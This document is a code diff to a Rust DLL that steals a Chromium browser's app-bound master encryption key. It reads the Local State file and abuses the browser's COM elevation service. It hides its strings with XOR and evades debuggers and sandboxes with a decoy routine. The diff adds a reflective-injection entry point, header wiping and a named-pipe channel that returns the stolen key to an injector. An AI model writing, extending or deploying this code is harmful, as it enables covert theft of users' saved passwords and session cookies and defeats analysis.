@@ -2,18 +2,21 @@
 
 mod elevator;
 mod dpapi_fallback;
+mod pipe;
+mod reflect;
 
-use std::{ffi::c_void, path::PathBuf, thread, time::Duration};
+use std::ffi::c_void;
+use std::path::PathBuf;
+use std::thread;
+use std::time::Duration;
 
-use windows::{
-    Win32::{
-        Foundation::{BOOL, HINSTANCE, TRUE},
-        System::{
-            Diagnostics::Debug::IsDebuggerPresent,
-            SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
-            SystemServices::DLL_PROCESS_ATTACH,
-            Threading::{CreateThread, THREAD_CREATION_FLAGS},
-        },
+use windows::Win32::{
+    Foundation::{BOOL, HINSTANCE, TRUE},
+    System::{
+        Diagnostics::Debug::IsDebuggerPresent,
+        SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX},
+        SystemServices::DLL_PROCESS_ATTACH,
+        Threading::{CreateThread, THREAD_CREATION_FLAGS},
     },
 };
 
@@ -21,19 +24,20 @@ const XOR_KEY: u8 = 0x5A;
 const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
 const MAX_CPU_CORES: usize = 2;
 
+/// Parameters passed from the injector into `Bootstrap`.
+#[repr(C)]
+pub struct BootstrapParams {
+    pub pipe_name: *const u16,
+    pub image_base: *mut c_void,
+    pub image_size: usize,
+}
+
 fn xor_str(data: &[u8]) -> String {
     String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
 }
 
 fn s_appb() -> Vec<u8> {
     xor_str(&[0x1B, 0x0A, 0x0A, 0x18]).into_bytes()
-}
-
-fn s_result_env() -> String {
-    xor_str(&[
-        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
-        0x05, 0x08, 0x1F, 0x09, 0x16, 0x0E, 0x0E,
-    ])
 }
 
 fn s_user_data_env() -> String {
@@ -67,23 +71,22 @@ fn s_local_state() -> String {
 }
 
 fn s_os_crypt_path() -> String {
-    xor_str(&[0x75, 0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x75, 0x3B, 0x2A, 0x2A, 0x05, 0x38, 0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23])
+    xor_str(&[
+        0x75, 0x35, 0x29, 0x05, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x75, 0x3B, 0x2A, 0x2A, 0x05, 0x38,
+        0x35, 0x2F, 0x34, 0x3E, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
+        0x31, 0x3F, 0x23,
+    ])
+}
+
+fn s_browser_name_env() -> String {
+    xor_str(&[
+        0x19, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
+        0x05, 0x18, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28, 0x05, 0x14, 0x3B, 0x37, 0x3F,
+    ])
 }
 
 fn s_chromium() -> String {
     xor_str(&[0x19, 0x32, 0x28, 0x35, 0x37, 0x33, 0x2F, 0x37])
-}
-
-fn s_browser_key() -> String {
-    xor_str(&[0x38, 0x28, 0x35, 0x2D, 0x29, 0x3F, 0x28])
-}
-
-fn s_master_key_hex() -> String {
-    xor_str(&[0x37, 0x3B, 0x29, 0x2E, 0x3F, 0x28, 0x05, 0x31, 0x3F, 0x23, 0x05, 0x32, 0x3F, 0x22])
-}
-
-fn s_error_key() -> String {
-    xor_str(&[0x3F, 0x28, 0x28, 0x35, 0x28])
 }
 
 fn s_decoy_name() -> String {
@@ -105,7 +108,6 @@ struct EnvGuard;
 
 impl Drop for EnvGuard {
     fn drop(&mut self) {
-        let _ = std::env::remove_var(s_result_env());
         let _ = std::env::remove_var(s_user_data_env());
         let _ = std::env::remove_var(s_data_root_env());
     }
@@ -149,6 +151,49 @@ fn run_decoy() {
     let _ = std::fs::write(std::env::temp_dir().join(s_decoy_name()), s_decoy_body());
 }
 
+/// Reflective entry point invoked by the injector via `NtCreateThreadEx`.
+/// Performs PE mapping (relocations/imports), connects to the named pipe, and
+/// runs the COM elevation workflow.
+#[no_mangle]
+pub unsafe extern "C" fn Bootstrap(params: *const BootstrapParams) -> u32 {
+    if params.is_null() {
+        return 1;
+    }
+    let p = &*params;
+    if p.image_base.is_null() || p.image_size == 0 {
+        return 1;
+    }
+
+    if is_debugger_attached() {
+        thread::sleep(Duration::from_secs(30));
+        return 1;
+    }
+    if is_restricted_host() {
+        run_decoy();
+        return 1;
+    }
+
+    if reflect::load_pe(p.image_base, p.image_size).is_err() {
+        let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| {
+            c.send_error(&xor_str(&[
+                0x28, 0x3F, 0x36, 0x3F, 0x39, 0x2E, 0x33, 0x3C, 0x3F, 0x7A, 0x36, 0x35, 0x3B, 0x3E,
+                0x7A, 0x3C, 0x3B, 0x33, 0x36, 0x3F, 0x3E,
+            ]))
+        });
+        return 1;
+    }
+
+    reflect::destroy_pe_headers(p.image_base);
+
+    match run_with_pipe(p) {
+        Ok(()) => 0,
+        Err(e) => {
+            let _ = pipe::connect_pipe_name(p.pipe_name).and_then(|c| c.send_error(&e));
+            1
+        }
+    }
+}
+
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
     _h: HINSTANCE,
@@ -156,32 +201,51 @@ pub unsafe extern "system" fn DllMain(
     _: *mut c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
-        if is_debugger_attached() {
-            thread::sleep(Duration::from_secs(30));
-            return TRUE;
-        }
-        if is_restricted_host() {
-            run_decoy();
-            return TRUE;
-        }
-        CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
+        CreateThread(None, 0, Some(legacy_worker), None, THREAD_CREATION_FLAGS(0), None).ok();
     }
     TRUE
 }
 
-unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
-    let _env_guard = EnvGuard;
-    thread::sleep(Duration::from_millis(800));
-    let r = std::panic::catch_unwind(run);
-    if let Ok(Err(e)) = r {
-        write_error(&e);
-    } else if r.is_err() {
-        write_error(&xor_str(&[0x2A, 0x3B, 0x34, 0x33, 0x39, 0x7A, 0x33, 0x34, 0x7A, 0x2A, 0x3B, 0x23, 0x36, 0x35, 0x3B, 0x3E]));
-    }
+unsafe extern "system" fn legacy_worker(_: *mut c_void) -> u32 {
     0
 }
 
-fn run() -> Result<(), String> {
+unsafe fn run_with_pipe(params: &BootstrapParams) -> Result<(), String> {
+    let _env_guard = EnvGuard;
+    thread::sleep(Duration::from_millis(200));
+
+    let client = pipe::connect_pipe_name(params.pipe_name)
+        .map_err(|_| String::from("pipe connect failed"))?;
+    client
+        .send_status("connected")
+        .map_err(|_| String::from("pipe status failed"))?;
+
+    let r = std::panic::catch_unwind(|| run_core(&client));
+    match r {
+        Ok(Ok(key_hex)) => {
+            let browser = std::env::var(s_browser_name_env()).unwrap_or_else(|_| s_chromium());
+            client
+                .send_result(&key_hex, &browser)
+                .map_err(|_| String::from("pipe result failed"))?;
+            Ok(())
+        }
+        Ok(Err(e)) => {
+            let _ = client.send_error(&e);
+            Err(e)
+        }
+        Err(_) => {
+            let msg = String::from("panic");
+            let _ = client.send_error(&msg);
+            Err(msg)
+        }
+    }
+}
+
+fn run_core(client: &pipe::PipeClient) -> Result<String, String> {
+    client
+        .send_status("reading local state")
+        .map_err(|_| String::from("pipe status failed"))?;
+
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
@@ -196,7 +260,12 @@ fn run() -> Result<(), String> {
     let key_b64 = ls
         .pointer(&s_os_crypt_path())
         .and_then(|v| v.as_str())
-        .ok_or_else(|| xor_str(&[0x3B, 0x2A, 0x2A, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05, 0x31, 0x3F, 0x23, 0x7A, 0x34, 0x35, 0x2E, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E]))?;
+        .ok_or_else(|| {
+            xor_str(&[
+                0x3B, 0x2A, 0x2A, 0x05, 0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x05,
+                0x31, 0x3F, 0x23, 0x7A, 0x34, 0x35, 0x2E, 0x7A, 0x3C, 0x35, 0x2F, 0x34, 0x3E,
+            ])
+        })?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
@@ -206,12 +275,22 @@ fn run() -> Result<(), String> {
 
     let appb = s_appb();
     if encrypted_key.len() < appb.len() {
-        return Err(xor_str(&[0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x31, 0x3F, 0x23, 0x7A, 0x2E, 0x35, 0x35, 0x7A, 0x29, 0x32, 0x35, 0x28, 0x2E]));
+        return Err(xor_str(&[
+            0x3F, 0x34, 0x39, 0x28, 0x23, 0x2A, 0x2E, 0x3F, 0x3E, 0x7A, 0x31, 0x3F, 0x23, 0x7A,
+            0x2E, 0x35, 0x35, 0x7A, 0x29, 0x32, 0x35, 0x28, 0x2E,
+        ]));
     }
     if !encrypted_key.starts_with(&appb) {
-        return Err(xor_str(&[0x37, 0x33, 0x29, 0x29, 0x33, 0x34, 0x3D, 0x7A, 0x1B, 0x0A, 0x0A, 0x18, 0x7A, 0x2A, 0x28, 0x3F, 0x3C, 0x33, 0x22]));
+        return Err(xor_str(&[
+            0x37, 0x33, 0x29, 0x29, 0x33, 0x34, 0x3D, 0x7A, 0x1B, 0x0A, 0x0A, 0x18, 0x7A, 0x2A,
+            0x28, 0x3F, 0x3C, 0x33, 0x22,
+        ]));
     }
     let encrypted_key = &encrypted_key[appb.len()..];
+
+    client
+        .send_status("calling com server")
+        .map_err(|_| String::from("pipe status failed"))?;
 
     let browser = elevator::resolve_browser(&exe);
     let com_result = match browser {
@@ -228,22 +307,17 @@ fn run() -> Result<(), String> {
         .map_err(|e| format!("key recovery: {e}"))?;
 
     if master_key.len() != 32 {
-        return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
+        return Err(format!(
+            "unexpected key length: {} (want 32)",
+            master_key.len()
+        ));
     }
 
-    let browser_label = browser.map(|b| b.name.clone()).unwrap_or(s_chromium());
-    let mut result = serde_json::Map::new();
-    result.insert(s_browser_key(), serde_json::Value::String(browser_label));
-    result.insert(
-        s_master_key_hex(),
-        serde_json::Value::String(master_key.iter().map(|b| format!("{b:02x}")).collect::<String>()),
-    );
+    client
+        .send_status("key recovered")
+        .map_err(|_| String::from("pipe status failed"))?;
 
-    let json = serde_json::to_string(&result).unwrap();
-    let path = result_path();
-    std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;
-
-    Ok(())
+    Ok(master_key.iter().map(|b| format!("{b:02x}")).collect::<String>())
 }
 
 fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
@@ -264,33 +338,18 @@ fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
     let browser = elevator::resolve_browser(exe)
         .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
 
-    let local_appdata = std::env::var(s_localappdata())
-        .map_err(|_| "LOCALAPPDATA not set")?;
+    let local_appdata = std::env::var(s_localappdata()).map_err(|_| "LOCALAPPDATA not set")?;
 
     let local_state_path = PathBuf::from(&local_appdata)
         .join(&browser.user_data_rel)
         .join(s_local_state());
 
     if !local_state_path.exists() {
-        return Err(format!("Local State not found: {}", local_state_path.display()));
+        return Err(format!(
+            "Local State not found: {}",
+            local_state_path.display()
+        ));
     }
 
     Ok(local_state_path)
-}
-
-fn result_path() -> PathBuf {
-    if let Ok(p) = std::env::var(s_result_env()) {
-        return PathBuf::from(p);
-    }
-    std::env::temp_dir().join(xor_str(&[
-        0x39, 0x32, 0x28, 0x35, 0x37, 0x3F, 0x05, 0x28, 0x3F, 0x39, 0x35, 0x2C, 0x3F, 0x28, 0x23,
-        0x05, 0x28, 0x3F, 0x29, 0x2F, 0x36, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34,
-    ]))
-}
-
-fn write_error(msg: &str) {
-    let mut obj = serde_json::Map::new();
-    obj.insert(s_error_key(), serde_json::Value::String(msg.to_string()));
-    let json = serde_json::to_string(&obj).unwrap();
-    let _ = std::fs::write(result_path(), json);
 }
